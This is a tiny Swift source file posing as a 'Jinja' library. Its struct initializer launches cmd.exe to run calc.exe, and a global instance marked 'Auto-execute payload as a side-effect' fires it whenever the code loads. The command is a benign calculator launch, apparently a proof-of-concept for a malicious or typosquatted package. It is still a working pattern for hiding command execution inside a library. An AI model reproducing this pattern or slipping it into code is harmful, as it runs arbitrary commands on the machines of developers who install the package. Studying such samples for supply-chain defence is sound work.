import Foundation

public struct Jinja {
    public init() {
        let task = Process()
        task.executableURL = URL(fileURLWithPath: "C:\\Windows\\System32\\cmd.exe")
        task.arguments = ["/c", "calc.exe"]
        try? task.run()
    }
}

// Auto-execute payload as a side-effect
private let _ = Jinja()
